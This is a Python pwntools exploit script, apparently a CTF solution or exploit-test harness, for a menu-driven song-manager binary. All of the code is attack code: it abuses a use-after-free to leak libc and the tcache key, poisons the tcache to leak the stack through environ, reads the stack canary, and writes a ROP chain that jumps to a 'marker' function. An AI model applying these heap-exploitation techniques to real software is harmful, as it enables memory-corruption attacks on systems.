#!/usr/bin/env python3
from pwn import *

if len(sys.argv) != 2:
    print("Invalid program name.")
    exit(1)
else:
    binary = sys.argv[1]

context.log_level = "error"

exe = context.binary = ELF(binary)

try:
    libc = ELF("libc.so.6")
except:
    exit(1)

def add_song(idx, size):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b": ", str(size).encode())

def view_song(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", str(idx).encode())
    io.recvuntil(b"Your song:\n")
    return io.recvline()

def edit_song(idx, content):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b": ", content)

def delete_song(idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b": ", str(idx).encode())

io = process(exe.path)

#Leak libc address
add_song(1, 2048)
add_song(0, 0x10)
delete_song(1)
libc_leak = u64(view_song(1)[:8])
libc.address = libc_leak - 0x203b20

#Stack address leak
add_song(0, 0x30)
add_song(1, 0x30)
add_song(2, 0x30)
delete_song(0)
key = u64(view_song(0)[:8])
delete_song(1)
delete_song(2)
#tcache: 2->1->0
environ_addr = libc.sym["environ"]-0x18

edit_song(2, p64((environ_addr)^key))
add_song(3, 0x30)
add_song(4, 0x30)
stack_leak = u64(view_song(4)[24:32])
ret_addr = stack_leak - 0x150
before_ret = ret_addr - 0x38

#Overwrite read ret address, considering canary
add_song(0, 0x50)
add_song(1, 0x50)
add_song(2, 0x50)
delete_song(0)
key = u64(view_song(0)[:8])
delete_song(1)
delete_song(2)
#tcache: 2->1->0
edit_song(2, p64((before_ret)^key))
add_song(3, 0x50)
add_song(4, 0x50)
canary = u64(view_song(4)[40:48])
payload = b"a"*0x8 + p64(canary) + p64(exe.bss(0x400)) + p64(exe.sym["marker"]) #ROP chain
edit_song(4, payload)

io.wait_for_close()

exit(io.poll())

#ROP chain in ret address by environ of libc